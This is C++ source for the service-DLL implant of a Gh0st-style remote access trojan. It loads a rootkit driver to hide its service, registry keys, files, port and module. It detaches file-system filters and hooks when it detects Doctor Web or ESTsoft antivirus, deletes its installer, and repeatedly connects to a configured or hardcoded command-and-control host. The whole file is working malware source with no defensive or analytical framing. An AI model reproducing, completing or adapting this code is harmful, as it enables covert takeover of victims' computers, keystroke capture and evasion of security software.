// svchost.cpp : Defines the entry point for the console application.
//

#pragma comment(linker, "/OPT:NOWIN98")
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
//#include "common/resetssdt.h"
//#include "common/hidelibrary.h"
#include "agony.c"
#include "LoadDriver.cpp"
#include "resetssdt.cpp"


enum
{
	NOT_CONNECT, //  ��û������
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60 * 3 // ����ʱ��
BOOL hCheck;  //���������ı�־
char lpDllPath[256] = {0};
//HANDLE hModuleDll;

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
//extern "C" __declspec(dllexport) bool ResetSSDT();

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);

LPSTR ExtractFileName(LPSTR lpcFullFileName)
{
	lpcFullFileName = strrchr(lpcFullFileName, '\\') + 1;
	return lpcFullFileName;
}

DWORD WINAPI CheckAndClearFiletrs(void)
{
	char lpFilePath[256] = {0};
	char szPackPath[256]={0};
	char szComLine[256]={0};
	char lpExpand[256]={0};
	char szFilePack[256]={0};
	char szUnFilePack[256]={0};
	char szDriverPath[256]={0};
	WIN32_FIND_DATA lpFindData;
Next:
	memset(lpFilePath,0,sizeof(lpFilePath));
	memset(&lpFindData,0,sizeof(WIN32_FIND_DATA));
	GetWindowsDirectory(lpFilePath,sizeof(lpFilePath));
	lstrcat(lpFilePath,"\\clear.log");
	memset(&lpFindData,0,sizeof(lpFindData));
	if (FindFirstFile(lpFilePath,&lpFindData) != INVALID_HANDLE_VALUE) //�ļ����ڣ���ʼժ���ļ�����������ɾ���ļ�
	{
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");
		DeleteFile(lpFilePath);
	}
/*
	memset(lpFilePath,0,sizeof(lpFilePath));
	memset(&lpFindData,0,sizeof(WIN32_FIND_DATA));
	GetWindowsDirectory(lpFilePath,sizeof(lpFilePath));
	lstrcat(lpFilePath,"\\reset.log");
	memset(&lpFindData,0,sizeof(lpFindData));
	if (FindFirstFile(lpFilePath,&lpFindData) != INVALID_HANDLE_VALUE) //�ļ����ڣ���ʼ�Կ�SSDT
	{
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");

		memset(szPackPath,0,sizeof(szPackPath));
		GetWindowsDirectory(szPackPath,sizeof(szPackPath));
		lstrcat(szPackPath,"\\amdevntas.temp");    //��������ɱ����
		//DeleteFile(szPackPath);
		ReleaseResource(CKeyboardManager::g_hInstance, 1123, "BINSYS", szPackPath,NULL); //�ͷ���������ɱ����
		
		memset(szDriverPath,0,sizeof(szDriverPath));
		GetWindowsDirectory(szDriverPath,sizeof(szDriverPath));
		lstrcat(szDriverPath,"\\system32\\amdevntas.sys");    //��������ɱ����
		
		memset(szComLine,0,sizeof(szComLine));
		memset(lpExpand,0,sizeof(lpExpand));
		
		GetWindowsDirectory(lpExpand,sizeof(lpExpand));
		lstrcat(lpExpand,"\\system32\\expand.exe");
		wsprintf(szComLine,"%s %s %s",lpExpand,szPackPath,szDriverPath);
		RunAProcess(szComLine);
		//OutputDebugString(szComLine);
		DeleteFile(szPackPath);

		if (_RegSetValue("SYSTEM\\CurrentControlSet\\Services\\PDRFRAME","ImagePath","system32\\amdevntas.sys",REG_EXPAND_SZ,strlen("system32\\amdevntas.sys")) == FALSE)
		{
			OutputDebugString("RegSetValue DllName failed");
		}
		
		RunAProcess("net start PDRFRAME");
		if (CheckDriverInstall() == FALSE)  //��netʧ�ܵĻ�����api
		{
			StartService("PDRFRAME");
		}
		DeleteFile(lpFilePath);
		ResetSsdt(NULL);
		RunAProcess("net stop PDRFRAME");
		DeleteFile(szDriverPath);
		HKEY	hKey0;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\PDRFRAME",NULL,\
			KEY_WRITE,&hKey0) == ERROR_SUCCESS)
		{
			RegDeleteValue(hKey0,"ImagePath");
			RegCloseKey(hKey0);
		}

	}*/
	Sleep(3000);
	goto Next;
	return	TRUE;
}

#ifdef _CONSOLE
int main(int argc, char **argv);
#else
DWORD WINAPI main(char *lpServiceName);
#endif
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// �����쳣�����´�������
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
// һ��Ҫ�㹻��
#ifdef _CONSOLE
#include <stdio.h>
int main(int argc, char **argv)
#else
DWORD WINAPI main(char *lpServiceName)
#endif
{
#ifdef _CONSOLE
	if (argc < 3)
	{
		printf("Usage:\n %s <Host> <Port>\n", argv[0]);
		return -1;
	}
#endif
	// lpServiceName,��ServiceMain���غ��û����
	char	strServiceName[256];
	char	strKillEvent[50];
	char lpDllModule[256] = {0};
	char lpPid[10] = {0};
	HANDLE	hInstallMutex = NULL;
#ifdef _DLL
	char	*lpURL = (char *)FindConfigString(CKeyboardManager::g_hInstance, "AAAAAA");
	if (lpURL == NULL)
	{
		return -1;
	}
	hCheck = TRUE;

	//���ͷ������ļ�
	char lpFilePath[256] = {0};
	WIN32_FIND_DATA lpFindData;
	OSVERSIONINFO systeminfo;
	char *lpIP = "192.168.1.18";


	HANDLE	hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckAndClearFiletrs,NULL, 0, NULL); //���õ�protect��̬��ɱ����

	lstrcpy(strServiceName, lpServiceName);
	
	GetWindowsDirectory(lpFilePath,sizeof(lpFilePath));
	lstrcat(lpFilePath,"\\KB0988764.log");
	memset(&lpFindData,0,sizeof(lpFindData));
	if (FindFirstFile(lpFilePath,&lpFindData) == INVALID_HANDLE_VALUE) //�ļ������ڣ�˵�����ǵ�һ�ΰ�װ������Ҫ������������
	{
		InstallDriver(CKeyboardManager::g_hInstance); //������������
	}else{
		DeleteFile(lpFilePath); //�ǵ�һ�ΰ�װ��ɾ���ļ�
	}
	////////////////////////////////////////////////
	HKEY hkESTsoft = HKEY_LOCAL_MACHINE;
	if(RegOpenKeyEx(hkESTsoft,"SOFTWARE\\ESTsoft", 0, KEY_QUERY_VALUE, &hkESTsoft) == ERROR_SUCCESS)
	{
		OutputDebugString("ESTsoft @update");
		RegCloseKey(hkESTsoft);
		CallMyDrivers("-ESTsoft","fuckESTsoft");  //

	}else
	{
		memset(lpPid,0,sizeof(lpPid));
		wsprintf(lpPid,"%d",GetCurrentProcessId());
		CallMyDrivers("-hook",lpPid);
	}

	HKEY hkRoot3 = HKEY_LOCAL_MACHINE;
	if(RegOpenKeyEx(hkRoot3,"SOFTWARE\\Doctor Web", 0, KEY_QUERY_VALUE, &hkRoot3) == ERROR_SUCCESS) //�ж��Ƿ���ڴ�֩�룬�Ա�ժ����������
	{
		OutputDebugString("Clearfilers @FileSystem");
		CallMyDrivers("-clearfilers","\\FileSystem\\Ntfs");  //����Ǵ�֩�룬��ժ���ļ���������
		RegCloseKey(hkRoot3);
	}

	//memset(lpDllPath,0,sizeof(lpDllPath));
	memset(lpDllModule,0,sizeof(lpDllModule));

	if (strstr(lpDllPath,".") != NULL)
	{
		wsprintf(lpDllModule,"%s",ExtractFileName(lpDllPath));
		CallMyDrivers("-hidedll",lpDllModule);
	}
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
	

	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
		//ResetSSDT();
		
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // ����¼���

		hInstallMutex = CreateMutex(NULL, true, lpURL);
		ReConfigService(strServiceName);
		// ɾ����װ�ļ�
		DeleteInstallFile(lpServiceName);          //�����������������ɱ��
	}

	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
#endif
	// ���߲���ϵͳ:���û���ҵ�CD/floppy disc,��Ҫ����������
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // �Ͽ����ӵ�ԭ��,��ʼ��Ϊ��û������
	while (1)
	{
		// �������������ʱ��������sleep������
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2���Ӷ�������, Ϊ�˾�����Ӧkillevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;
					
				}
				// ��һ��
				Sleep(60);
			}
		}
		char lpPort[10] = {0};
		
		if (hCheck == TRUE)
		{
			CallMyDrivers("-services",strServiceName); //���ط���
			memset(&systeminfo,0,sizeof(OSVERSIONINFO));
			systeminfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
			GetVersionEx(&systeminfo);
			if (systeminfo.dwBuildNumber != 2195) //�������windows 2000���Ϳ�������ע���
			{
				OutputDebugString("isn't windows 2000");
				CallMyDrivers("-key",strServiceName); //����ע���
			}
			CallMyDrivers("-file","USA"); //�����ļ�
			hCheck = FALSE; //�Ѿ����ع������ˣ�
		}
#ifdef _DLL
		// ���߼��Ϊ2��, ǰ6��'A'�Ǳ�־
		if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost, 
				&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}
#else
		lpszHost = argv[1];
		dwPort = atoi(argv[2]);
#endif
		DWORD dwTickCount = GetTickCount();
		if (lpszProxyHost != NULL) //
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();


		WIN32_FIND_DATA lpCheckData;
		char lpFilePath1[256] = {0};

		memset(lpFilePath1,0,sizeof(lpFilePath1));
		GetWindowsDirectory(lpFilePath1,sizeof(lpFilePath1));
		lstrcat(lpFilePath1,"\\KBlog.log");
		memset(&lpCheckData,0,sizeof(lpCheckData));
		if (FindFirstFile(lpFilePath1,&lpCheckData) != INVALID_HANDLE_VALUE) //�ļ����ڣ����������õ�IP����Զ������
		{
			lpszHost = NULL;
			lpszHost = lpIP;
		}
 		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// ��¼
		DWORD dwExitCode = SOCKET_ERROR; //
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);  //��AVAST���ˣ�ȥ�����̼�¼�Ϳ��Թ�avast
		socketClient.setManagerCallBack(&manager);

		memset(lpPort,0,sizeof(lpPort));
		wsprintf(lpPort,"%d",dwPort);
		CallMyDrivers("-port",lpPort); //���ض˿�
		CallMyDrivers("-check","fuck"); //����hook
		//////////////////////////////////////////////////////////////////////////
		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// ����Ҫ�ָ�׿�棬��Ϊ����Ǹ��·���˵Ļ����·���������У��˽��ָ̻�����׿�棬���������
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
	
}

BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		GetModuleFileName((HINSTANCE)hModule,lpDllPath,sizeof(lpDllPath));
	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;
	case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
/*
extern "C" __declspec(dllexport) bool ResetSSDT()
{
	return RestoreSSDT(CKeyboardManager::g_hInstance);
}
*/
extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }else FreeConsole();
	
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
    // call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
     do{
         Sleep(100);//not quit until receive stop command, otherwise the service will stop
     }while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	if (g_dwServiceType == 0x120)
	{
		//Shared�ķ��� ServiceMain ���˳�����ȻһЩϵͳ��svchost����Ҳ���˳�
		while (1) Sleep(10000);
	}
    return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}
